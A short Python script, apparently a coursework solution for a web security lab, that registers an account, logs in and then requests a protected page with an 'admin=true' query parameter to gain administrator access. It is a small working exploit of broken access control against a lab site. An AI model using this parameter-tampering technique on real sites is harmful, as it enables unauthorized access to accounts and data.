import requests, hashlib 
 
username = "username" 
password = "Password1" 
email = "username@gmail.com" 
def hash_password(password):
	m = hashlib.sha512()
	m.update(password)
	hashed_password = m.hexdigest()
	return hashed_password

hashed_password = hash_password(password)
url = "http://wsb.com/Homework3/case12/register.php" 
data = { "username": username, "email": email, "p": hashed_password } 
response = requests.post(url, data=data) 
 
session = requests.Session()  
url = "http://wsb.com/Homework3/case12/includes/process_login.php" 
data = { "email": email, "p": hashed_password } 
response= session.post(url, data=data) 
 
url = "http://www.wsb.com/Homework3/case12/protected_page.php?admin=true" 
response = session.get(url) 
 
print response.content
